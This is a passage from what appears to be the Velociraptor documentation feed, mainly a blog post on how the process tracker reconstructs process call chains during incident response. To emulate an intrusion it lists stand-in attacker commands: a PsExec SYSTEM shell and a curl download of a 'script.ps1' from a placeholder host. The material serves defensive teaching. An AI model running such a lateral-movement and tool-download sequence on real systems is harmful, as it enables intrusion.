&lt;h2 id="assigning-clients-to-the-hunt">Assigning clients to the hunt.&lt;/h2>
&lt;p>Normally when we limit a hunt for a label we immediately schedule the
hunt on all machines with that label.&lt;/p>
&lt;p>However it also works the other way around - When a label is added on
a client, if the hunt targets this label, the client will be
automatically added to the hunt!&lt;/p>
&lt;p>This means it is possible to create heavy hunts targeting specific
labels, and then as the investigation progresses, simply assign the
label to the client to automatically cause the hunt to collect on that
client.&lt;/p>
&lt;p>











&lt;figure id="ea294614153c0d0ea666c75a2d1b6b1f">
 &lt;div data-featherlight="#ea294614153c0d0ea666c75a2d1b6b1f" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/hunt_by_label/apply_label.png" alt="Apply a label to a client to trigger hunt participation">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="apply_label.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Apply a label to a client to trigger hunt participation
 &lt;/figcaption>
&lt;/figure>




&lt;/p></description></item><item><title>The Velociraptor process tracker</title><link>https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/</link><pubDate>Wed, 07 Sep 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/</guid><description>&lt;p>One of the advantages of running Velociraptor on the endpoint
constantly is the ability to monitor the endpoint using &lt;a href="https://docs.velociraptor.app/docs/clients/monitoring/" >client
monitoring queries&lt;/a>
. Gaining
visibility to volatile information is critical to reconstructing past
activity and responding to new threats.&lt;/p>
&lt;p>Commonly, attackers subvert the endpoint by creating new
processes. For example, an attacker might execute malicious office
macros as their initial compromise, but then follow it by launching
PowerShell or C# code - or commonly Living Off The Land binaries
(&lt;code>LOLBins&lt;/code>).&lt;/p>
&lt;p>We can use information about processes to identify suspicious
processes which may represent malicious activity. In the next example
I will explore a typical case and how it can be investigated using
Velociraptor.&lt;/p>
&lt;h2 id="a-typical-intrusion">A Typical intrusion&lt;/h2>
&lt;p>A common lateral movement methodology is using &lt;code>PsExec.exe&lt;/code> to create
a system level service (usually remotely). I will run the following commands to emulate typical attacker activities:&lt;/p>
&lt;pre>&lt;code>psexec.exe /s powershell
ping.exe www.google.com
curl.exe -o script.ps1 https://www.google.com/
notepad.exe
&lt;/code>&lt;/pre>
&lt;p>First I create a system level shell with &lt;code>PsExec.exe&lt;/code>, then I perform
some reconnaissance on the network. Then I download a tool from a
remote system. Finally I run my malicious process (in this case I use
&lt;code>notepad.exe&lt;/code> but in real life this will be some backdoor like &lt;code>Cobalt Strike&lt;/code>).&lt;/p>
&lt;h2 id="responding-to-this-system">Responding to this system.&lt;/h2>
&lt;p>For this example, suppose I was able to identify the malicious process
(&lt;code>notepad.exe&lt;/code>) using other means (for example the
&lt;code>Windows.Detection.Yara.Process&lt;/code> artifact by scanning process memory).&lt;/p>
&lt;p>Now I need to get more context about this process:&lt;/p>
&lt;ol>
&lt;li>Where did it come from?&lt;/li>
&lt;li>Who started it and when?&lt;/li>
&lt;li>What other activity was done around the time the process was started?&lt;/li>
&lt;/ol>
&lt;p>To answer the first question we need to see which process was the
parent of the malicious process (and construct the full call chain).&lt;/p>
&lt;p>For this example I will use &lt;a href="https://processhacker.sourceforge.io/" target="_blank" >Process
Hacker&lt;/a>
 - a very popular GUI
for inspecting processes.&lt;/p>
&lt;p>











&lt;figure id="fe74752271034606a9f5e7f804f3799a">
 &lt;div data-featherlight="#fe74752271034606a9f5e7f804f3799a" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/process_hacker.png" alt="Process Hacker output of our suspicious process">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="process_hacker.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Process Hacker output of our suspicious process
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Normally Process Hacker displays processes in a tree form - we can see
which process spawned each process. But in this case, there is no
parent shown for &lt;code>notepad.exe&lt;/code>. Closer inspection shows that the
parent process has actually exited, so Process Hacker has no further
information about it.&lt;/p>
&lt;p>This limitation of process inspection is central to live triage - the
API can not provide any information about processes that have already
exited. Therefore, parent/child relationships are broken.&lt;/p>
&lt;h2 id="using-velociraptor-to-gather-process-context">Using Velociraptor to gather process context&lt;/h2>
&lt;p>Now, I will use Velociraptor&amp;rsquo;s &lt;code>Generic.System.Pstree&lt;/code> artifact to
reconstruct the process call chain of all processes on the system. I
will enable the collection of the process tree visualization.&lt;/p>
&lt;p>











&lt;figure id="588efb4705dae35b6656263c98d21e7a">
 &lt;div data-featherlight="#588efb4705dae35b6656263c98d21e7a" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/collecting_pstree.png" alt="Collecting the Process Tree">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="collecting_pstree.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Collecting the Process Tree
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The artifact collects process call trace information from all
processes by following their parent/child relationships. I now filter
the table to just show the &lt;code>notepad.exe&lt;/code> process, and see that the
process call tree looks very suspicious!&lt;/p>
&lt;p>











&lt;figure id="e288df600eb289f4274d7d237687075f">
 &lt;div data-featherlight="#e288df600eb289f4274d7d237687075f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/pstree.png" alt="Velociraptors Generic.System.Pstree artifact can clearly show the call chain">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="pstree.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Velociraptors Generic.System.Pstree artifact can clearly show the call chain
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Velociraptor&amp;rsquo;s &lt;code>Generic.System.Pstree&lt;/code> artifact clearly shows the full
call chain - the process was started through a &lt;code>PSEXESVC.exe&lt;/code> service
and powershell. This additional context shines light on the initial
intrusion pathway.&lt;/p>
&lt;h2 id="viewing-sibling-processes">Viewing sibling processes&lt;/h2>
&lt;p>Launching &lt;code>notepad.exe&lt;/code> is the final stage of a more complete attack
chain. Let&amp;rsquo;s inspect the parent process in our &lt;code>PsTree&lt;/code> collection
(&lt;code>powershell.exe&lt;/code>) to learn what other sibling processes (to our
suspicious &lt;code>notepad.exe&lt;/code>) were launched as part of the original attack
chain.&lt;/p>
&lt;p>











&lt;figure id="2a50507d5c0e4dda0ed7407bed0b9539">
 &lt;div data-featherlight="#2a50507d5c0e4dda0ed7407bed0b9539" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/powershell.png" alt="Inspecting the powershell process">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="powershell.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Inspecting the powershell process
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Clicking the &lt;code>Process Tree&lt;/code> button brings out the new Process Tree
visualization - rendering all the children of the powershell and their
respective children.&lt;/p>
&lt;p>











&lt;figure id="e058d78fda0b7d651d91733400185ff1">
 &lt;div data-featherlight="#e058d78fda0b7d651d91733400185ff1" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/powershell_pstree.png" alt="Inspecting the full process chain of the powershell process">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="powershell_pstree.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Inspecting the full process chain of the powershell process
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>As can be clearly seen from this visualization, Velociraptor reports
seeing the &lt;code>ping.exe&lt;/code> process first, then the &lt;code>curl.exe&lt;/code> process and
finally the &lt;code>notepad.exe&lt;/code> process. You might also notice that
&lt;code>curl.exe&lt;/code> as shown in the visualization has already exited by the
time the process tree was collected!&lt;/p>
&lt;h2 id="how-can-velociraptor-show-the-complete-process-call-chain">How can Velociraptor show the complete process call chain?&lt;/h2>
&lt;p>The process call chain is very useful for us to gather some important
context but how does Velociraptor know about processes that have
already exited? After all the API will not reveal this information
which is why &lt;code>Process Hacker&lt;/code> can not construct the full call chain?&lt;/p>
&lt;p>One of the most exciting additions to Velociraptor in recent releases
was the addition of the &lt;code>process tracker&lt;/code>. The Process tracker is an
internal tool that keeps track of processes and their children
continuously. By tracking historical process activity on the end point
we can answer questions like &lt;code>Which process launched this Process ID?&lt;/code>
quickly, even if the original parent has already exited - we do not
need to rely on the API to gather this information.&lt;/p>
&lt;p>The diagram below illustrates how the process tracker works&lt;/p>
&lt;p>








 
 

&lt;figure id="90f25198cef50ebfcb4aa7e652581bb9">
 &lt;div data-featherlight="#90f25198cef50ebfcb4aa7e652581bb9" class="figure">
 &lt;svg version="1.1" viewBox="0.0 0.0 960.0 720.0" fill="none" stroke="none" stroke-linecap="square" stroke-miterlimit="10" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg">&lt;clipPath id="p.0">&lt;path d="m0 0l960.0 0l0 720.0l-960.0 0l0 -720.0z" clip-rule="nonzero"/>&lt;/clipPath>&lt;g clip-path="url(#p.0)">&lt;path fill="#000000" fill-opacity="0.0" d="m0 0l960.0 0l0 720.0l-960.0 0z" fill-rule="evenodd"/>&lt;path fill="#cfe2f3" d="m68.908134 163.36789l0 0c0 -11.8403015 9.598457 -21.438751 21.438751 -21.438751l246.19336 0c5.685913 0 11.138947 2.2587128 15.159485 6.2792664c4.0205383 4.0205383 6.2792664 9.473572 6.2792664 15.159485l0 85.75241c0 11.8403015 -9.59845 21.438751 -21.438751 21.438751l-246.19336 0l0 0c-11.840294 0 -21.438751 -9.59845 -21.438751 -21.438751z" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="1.0" stroke-linejoin="round" stroke-linecap="butt" d="m68.908134 163.36789l0 0c0 -11.8403015 9.598457 -21.438751 21.438751 -21.438751l246.19336 0c5.685913 0 11.138947 2.2587128 15.159485 6.2792664c4.0205383 4.0205383 6.2792664 9.473572 6.2792664 15.159485l0 85.75241c0 11.8403015 -9.59845 21.438751 -21.438751 21.438751l-246.19336 0l0 0c-11.840294 0 -21.438751 -9.59845 -21.438751 -21.438751z" fill-rule="evenodd"/>&lt;path fill="#000000" d="m86.07796 185.78409l0 -17.1875l7.609375 0q2.296875 0 3.484375 0.46875q1.203125 0.46875 1.921875 1.640625q0.71875 1.171875 0.71875 2.578125q0 1.828125 -1.1875 3.09375q-1.1875 1.25 -3.65625 1.59375q0.90625 0.421875 1.375 0.84375q1.0 0.921875 1.890625 2.296875l2.984375 4.671875l-2.859375 0l-2.28125 -3.578125q-0.984375 -1.546875 -1.640625 -2.359375q-0.640625 -0.828125 -1.15625 -1.15625q-0.5 -0.328125 -1.03125 -0.453125q-0.390625 -0.078125 -1.265625 -0.078125l-2.640625 0l0 7.625l-2.265625 0zm2.265625 -9.59375l4.890625 0q1.5625 0 2.4375 -0.328125q0.875 -0.328125 1.328125 -1.03125q0.46875 -0.703125 0.46875 -1.546875q0 -1.21875 -0.890625 -2.0q-0.875 -0.78125 -2.796875 -0.78125l-5.4375 0l0 5.6875zm23.285156 5.578125l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm19.878906 5.890625q-1.171875 0.984375 -2.265625 1.40625q-1.078125 0.40625 -2.3125 0.40625q-2.046875 0 -3.15625 -1.0q-1.09375 -1.0 -1.09375 -2.5625q0 -0.921875 0.40625 -1.671875q0.421875 -0.75 1.09375 -1.203125q0.671875 -0.46875 1.515625 -0.703125q0.625 -0.15625 1.875 -0.3125q2.5625 -0.3125 3.765625 -0.734375q0.015625 -0.421875 0.015625 -0.546875q0 -1.28125 -0.609375 -1.8125q-0.796875 -0.71875 -2.390625 -0.71875q-1.5 0 -2.203125 0.53125q-0.703125 0.515625 -1.046875 1.84375l-2.0625 -0.28125q0.28125 -1.328125 0.921875 -2.140625q0.640625 -0.8125 1.859375 -1.25q1.21875 -0.453125 2.828125 -0.453125q1.59375 0 2.59375 0.375q1.0 0.375 1.46875 0.953125q0.46875 0.5625 0.65625 1.4375q0.09375 0.53125 0.09375 1.9375l0 2.8125q0 2.9375 0.140625 3.71875q0.140625 0.78125 0.53125 1.5l-2.203125 0q-0.328125 -0.65625 -0.421875 -1.53125zm-0.171875 -4.71875q-1.15625 0.46875 -3.453125 0.796875q-1.296875 0.1875 -1.84375 0.421875q-0.53125 0.234375 -0.828125 0.6875q-0.28125 0.453125 -0.28125 1.0q0 0.84375 0.625 1.40625q0.640625 0.5625 1.875 0.5625q1.21875 0 2.171875 -0.53125q0.953125 -0.53125 1.390625 -1.453125q0.34375 -0.71875 0.34375 -2.109375l0 -0.78125zm5.3476562 6.25l0 -17.1875l2.109375 0l0 17.1875l-2.109375 0zm16.65625 -1.890625l0.3125 1.859375q-0.890625 0.203125 -1.59375 0.203125q-1.15625 0 -1.796875 -0.359375q-0.625 -0.375 -0.890625 -0.96875q-0.25 -0.59375 -0.25 -2.484375l0 -7.171875l-1.546875 0l0 -1.640625l1.546875 0l0 -3.078125l2.09375 -1.265625l0 4.34375l2.125 0l0 1.640625l-2.125 0l0 7.28125q0 0.90625 0.109375 1.171875q0.125 0.25 0.375 0.40625q0.25 0.140625 0.71875 0.140625q0.34375 0 0.921875 -0.078125zm2.0742188 -12.859375l0 -2.4375l2.109375 0l0 2.4375l-2.109375 0zm0 14.75l0 -12.453125l2.109375 0l0 12.453125l-2.109375 0zm5.3164062 0l0 -12.453125l1.890625 0l0 1.75q0.59375 -0.90625 1.5625 -1.46875q0.96875 -0.5625 2.21875 -0.5625q1.375 0 2.25 0.578125q0.890625 0.578125 1.265625 1.609375q1.46875 -2.1875 3.84375 -2.1875q1.84375 0 2.84375 1.03125q1.0 1.03125 1.0 3.15625l0 8.546875l-2.109375 0l0 -7.84375q0 -1.265625 -0.203125 -1.8125q-0.203125 -0.5625 -0.75 -0.90625q-0.53125 -0.34375 -1.25 -0.34375q-1.3125 0 -2.1875 0.875q-0.859375 0.875 -0.859375 2.796875l0 7.234375l-2.109375 0l0 -8.09375q0 -1.40625 -0.515625 -2.109375q-0.515625 -0.703125 -1.6875 -0.703125q-0.890625 0 -1.65625 0.46875q-0.75 0.46875 -1.09375 1.375q-0.34375 0.90625 -0.34375 2.609375l0 6.453125l-2.109375 0zm28.523438 -4.015625l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm26.953125 3.40625l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm15.222656 7.421875l-4.734375 -12.453125l2.21875 0l2.671875 7.453125q0.4375 1.21875 0.796875 2.515625q0.28125 -0.984375 0.78125 -2.375l2.765625 -7.59375l2.171875 0l-4.703125 12.453125l-1.96875 0zm17.0625 -4.015625l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm11.753906 7.421875l0 -12.453125l1.90625 0l0 1.78125q1.375 -2.0625 3.953125 -2.0625q1.125 0 2.0625 0.40625q0.953125 0.40625 1.421875 1.0625q0.46875 0.65625 0.65625 1.5625q0.125 0.578125 0.125 2.046875l0 7.65625l-2.109375 0l0 -7.578125q0 -1.28125 -0.25 -1.921875q-0.25 -0.640625 -0.875 -1.015625q-0.625 -0.390625 -1.46875 -0.390625q-1.34375 0 -2.328125 0.859375q-0.984375 0.859375 -0.984375 3.25l0 6.796875l-2.109375 0zm17.957031 -1.890625l0.3125 1.859375q-0.890625 0.203125 -1.59375 0.203125q-1.15625 0 -1.796875 -0.359375q-0.625 -0.375 -0.890625 -0.96875q-0.25 -0.59375 -0.25 -2.484375l0 -7.171875l-1.546875 0l0 -1.640625l1.546875 0l0 -3.078125l2.09375 -1.265625l0 4.34375l2.125 0l0 1.640625l-2.125 0l0 7.28125q0 0.90625 0.109375 1.171875q0.125 0.25 0.375 0.40625q0.25 0.140625 0.71875 0.140625q0.34375 0 0.921875 -0.078125z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m93.89046 210.2216l2.078125 0.265625q-0.34375 2.15625 -1.75 3.375q-1.390625 1.203125 -3.4375 1.203125q-2.546875 0 -4.109375 -1.671875q-1.546875 -1.671875 -1.546875 -4.78125q0 -2.015625 0.671875 -3.53125q0.671875 -1.515625 2.03125 -2.265625q1.359375 -0.765625 2.96875 -0.765625q2.03125 0 3.3125 1.03125q1.296875 1.03125 1.65625 2.90625l-2.046875 0.328125q-0.296875 -1.265625 -1.046875 -1.890625q-0.734375 -0.640625 -1.796875 -0.640625q-1.59375 0 -2.59375 1.15625q-0.984375 1.140625 -0.984375 3.609375q0 2.5 0.953125 3.640625q0.96875 1.140625 2.515625 1.140625q1.234375 0 2.0625 -0.765625q0.84375 -0.765625 1.0625 -2.34375zm3.859375 4.5625l0 -12.453125l1.890625 0l0 1.890625q0.734375 -1.328125 1.34375 -1.75q0.625 -0.421875 1.359375 -0.421875q1.0625 0 2.171875 0.6875l-0.734375 1.953125q-0.765625 -0.453125 -1.546875 -0.453125q-0.6875 0 -1.25 0.421875q-0.546875 0.40625 -0.78125 1.140625q-0.34375 1.125 -0.34375 2.46875l0 6.515625l-2.109375 0zm16.539062 -4.015625l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm19.878906 5.890625q-1.171875 0.984375 -2.265625 1.40625q-1.078125 0.40625 -2.3125 0.40625q-2.046875 0 -3.15625 -1.0q-1.09375 -1.0 -1.09375 -2.5625q0 -0.921875 0.40625 -1.671875q0.421875 -0.75 1.09375 -1.203125q0.671875 -0.46875 1.515625 -0.703125q0.625 -0.15625 1.875 -0.3125q2.5625 -0.3125 3.765625 -0.734375q0.015625 -0.421875 0.015625 -0.546875q0 -1.28125 -0.609375 -1.8125q-0.796875 -0.71875 -2.390625 -0.71875q-1.5 0 -2.203125 0.53125q-0.703125 0.515625 -1.046875 1.84375l-2.0625 -0.28125q0.28125 -1.328125 0.921875 -2.140625q0.640625 -0.8125 1.859375 -1.25q1.21875 -0.453125 2.828125 -0.453125q1.59375 0 2.59375 0.375q1.0 0.375 1.46875 0.953125q0.46875 0.5625 0.65625 1.4375q0.09375 0.53125 0.09375 1.9375l0 2.8125q0 2.9375 0.140625 3.71875q0.140625 0.78125 0.53125 1.5l-2.203125 0q-0.328125 -0.65625 -0.421875 -1.53125zm-0.171875 -4.71875q-1.15625 0.46875 -3.453125 0.796875q-1.296875 0.1875 -1.84375 0.421875q-0.53125 0.234375 -0.828125 0.6875q-0.28125 0.453125 -0.28125 1.0q0 0.84375 0.625 1.40625q0.640625 0.5625 1.875 0.5625q1.21875 0 2.171875 -0.53125q0.953125 -0.53125 1.390625 -1.453125q0.34375 -0.71875 0.34375 -2.109375l0 -0.78125zm10.003906 4.359375l0.3125 1.859375q-0.890625 0.203125 -1.59375 0.203125q-1.15625 0 -1.796875 -0.359375q-0.625 -0.375 -0.890625 -0.96875q-0.25 -0.59375 -0.25 -2.484375l0 -7.171875l-1.546875 0l0 -1.640625l1.546875 0l0 -3.078125l2.09375 -1.265625l0 4.34375l2.125 0l0 1.640625l-2.125 0l0 7.28125q0 0.90625 0.109375 1.171875q0.125 0.25 0.375 0.40625q0.25 0.140625 0.71875 0.140625q0.34375 0 0.921875 -0.078125zm2.0742188 -12.859375l0 -2.4375l2.109375 0l0 2.4375l-2.109375 0zm0 14.75l0 -12.453125l2.109375 0l0 12.453125l-2.109375 0zm4.5351562 -6.21875q0 -3.46875 1.921875 -5.125q1.609375 -1.390625 3.921875 -1.390625q2.5625 0 4.1875 1.6875q1.625 1.6875 1.625 4.640625q0 2.40625 -0.71875 3.78125q-0.71875 1.375 -2.09375 2.140625q-1.375 0.765625 -3.0 0.765625q-2.625 0 -4.234375 -1.671875q-1.609375 -1.6875 -1.609375 -4.828125zm2.171875 0q0 2.390625 1.03125 3.578125q1.046875 1.1875 2.640625 1.1875q1.5625 0 2.609375 -1.1875q1.046875 -1.203125 1.046875 -3.65625q0 -2.3125 -1.0625 -3.5q-1.046875 -1.1875 -2.59375 -1.1875q-1.59375 0 -2.640625 1.1875q-1.03125 1.1875 -1.03125 3.578125zm11.957031 6.21875l0 -12.453125l1.90625 0l0 1.78125q1.375 -2.0625 3.953125 -2.0625q1.125 0 2.0625 0.40625q0.953125 0.40625 1.421875 1.0625q0.46875 0.65625 0.65625 1.5625q0.125 0.578125 0.125 2.046875l0 7.65625l-2.109375 0l0 -7.578125q0 -1.28125 -0.25 -1.921875q-0.25 -0.640625 -0.875 -1.015625q-0.625 -0.390625 -1.46875 -0.390625q-1.34375 0 -2.328125 0.859375q-0.984375 0.859375 -0.984375 3.25l0 6.796875l-2.109375 0zm19.171875 -3.71875l2.09375 -0.328125q0.171875 1.25 0.96875 1.921875q0.8125 0.671875 2.25 0.671875q1.453125 0 2.15625 -0.59375q0.703125 -0.59375 0.703125 -1.390625q0 -0.71875 -0.625 -1.125q-0.421875 -0.28125 -2.15625 -0.71875q-2.3125 -0.578125 -3.21875 -1.0q-0.890625 -0.4375 -1.359375 -1.1875q-0.453125 -0.765625 -0.453125 -1.671875q0 -0.828125 0.375 -1.53125q0.390625 -0.71875 1.046875 -1.1875q0.484375 -0.359375 1.328125 -0.609375q0.859375 -0.265625 1.828125 -0.265625q1.46875 0 2.578125 0.421875q1.109375 0.421875 1.625 1.15625q0.53125 0.71875 0.734375 1.921875l-2.0625 0.28125q-0.140625 -0.96875 -0.8125 -1.5q-0.671875 -0.546875 -1.90625 -0.546875q-1.453125 0 -2.078125 0.484375q-0.625 0.484375 -0.625 1.125q0 0.40625 0.265625 0.734375q0.25 0.34375 0.8125 0.5625q0.3125 0.125 1.859375 0.546875q2.234375 0.59375 3.109375 0.984375q0.890625 0.375 1.390625 1.109375q0.515625 0.71875 0.515625 1.796875q0 1.046875 -0.625 1.984375q-0.609375 0.9375 -1.765625 1.453125q-1.15625 0.5 -2.625 0.5q-2.421875 0 -3.703125 -1.0q-1.265625 -1.015625 -1.625 -3.0zm12.0625 -2.5q0 -3.46875 1.921875 -5.125q1.609375 -1.390625 3.921875 -1.390625q2.5625 0 4.1875 1.6875q1.625 1.6875 1.625 4.640625q0 2.40625 -0.71875 3.78125q-0.71875 1.375 -2.09375 2.140625q-1.375 0.765625 -3.0 0.765625q-2.625 0 -4.234375 -1.671875q-1.609375 -1.6875 -1.609375 -4.828125zm2.171875 0q0 2.390625 1.03125 3.578125q1.046875 1.1875 2.640625 1.1875q1.5625 0 2.609375 -1.1875q1.046875 -1.203125 1.046875 -3.65625q0 -2.3125 -1.0625 -3.5q-1.046875 -1.1875 -2.59375 -1.1875q-1.59375 0 -2.640625 1.1875q-1.03125 1.1875 -1.03125 3.578125zm20.113281 6.21875l0 -1.828125q-1.453125 2.109375 -3.9375 2.109375q-1.109375 0 -2.0625 -0.421875q-0.953125 -0.421875 -1.421875 -1.0625q-0.453125 -0.640625 -0.640625 -1.5625q-0.140625 -0.625 -0.140625 -1.96875l0 -7.71875l2.109375 0l0 6.90625q0 1.65625 0.140625 2.234375q0.1875 0.828125 0.828125 1.3125q0.65625 0.46875 1.609375 0.46875q0.9375 0 1.765625 -0.484375q0.84375 -0.5 1.1875 -1.328125q0.34375 -0.84375 0.34375 -2.4375l0 -6.671875l2.109375 0l0 12.453125l-1.890625 0zm5.1757812 0l0 -12.453125l1.890625 0l0 1.890625q0.734375 -1.328125 1.34375 -1.75q0.625 -0.421875 1.359375 -0.421875q1.0625 0 2.171875 0.6875l-0.734375 1.953125q-0.765625 -0.453125 -1.546875 -0.453125q-0.6875 0 -1.25 0.421875q-0.546875 0.40625 -0.78125 1.140625q-0.34375 1.125 -0.34375 2.46875l0 6.515625l-2.109375 0zm16.132812 -4.5625l2.078125 0.265625q-0.34375 2.15625 -1.75 3.375q-1.390625 1.203125 -3.4375 1.203125q-2.546875 0 -4.109375 -1.671875q-1.546875 -1.671875 -1.546875 -4.78125q0 -2.015625 0.671875 -3.53125q0.671875 -1.515625 2.03125 -2.265625q1.359375 -0.765625 2.96875 -0.765625q2.03125 0 3.3125 1.03125q1.296875 1.03125 1.65625 2.90625l-2.046875 0.328125q-0.296875 -1.265625 -1.046875 -1.890625q-0.734375 -0.640625 -1.796875 -0.640625q-1.59375 0 -2.59375 1.15625q-0.984375 1.140625 -0.984375 3.609375q0 2.5 0.953125 3.640625q0.96875 1.140625 2.515625 1.140625q1.234375 0 2.0625 -0.765625q0.84375 -0.765625 1.0625 -2.34375zm12.40625 0.546875l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm26.57811 7.421875l0 -1.828125q-1.453125 2.109375 -3.9375 2.109375q-1.109375 0 -2.0625 -0.421875q-0.953125 -0.421875 -1.421875 -1.0625q-0.453125 -0.640625 -0.640625 -1.5625q-0.140625 -0.625 -0.140625 -1.96875l0 -7.71875l2.109375 0l0 6.90625q0 1.65625 0.140625 2.234375q0.1875 0.828125 0.828125 1.3125q0.65625 0.46875 1.609375 0.46875q0.9375 0 1.765625 -0.484375q0.84375 -0.5 1.1875 -1.328125q0.34375 -0.84375 0.34375 -2.4375l0 -6.671875l2.109375 0l0 12.453125l-1.890625 0zm4.3476562 -3.71875l2.09375 -0.328125q0.171875 1.25 0.96875 1.921875q0.8125 0.671875 2.25 0.671875q1.453125 0 2.15625 -0.59375q0.703125 -0.59375 0.703125 -1.390625q0 -0.71875 -0.625 -1.125q-0.421875 -0.28125 -2.15625 -0.71875q-2.3125 -0.578125 -3.21875 -1.0q-0.890625 -0.4375 -1.359375 -1.1875q-0.453125 -0.765625 -0.453125 -1.671875q0 -0.828125 0.375 -1.53125q0.390625 -0.71875 1.046875 